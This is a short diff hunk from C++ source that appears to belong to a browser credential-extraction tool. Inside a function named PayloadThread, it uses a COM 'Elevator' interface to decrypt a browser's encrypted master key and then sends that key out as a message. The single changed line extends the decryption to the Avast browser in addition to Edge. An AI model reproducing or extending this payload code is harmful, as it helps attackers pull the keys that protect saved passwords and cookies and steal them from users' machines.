@@ -111,7 +111,7 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
             std::vector<uint8_t> masterKey;
             {
                 Com::Elevator elevator;
-                masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge");
+                masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
             }
 
             // Send key as structured message
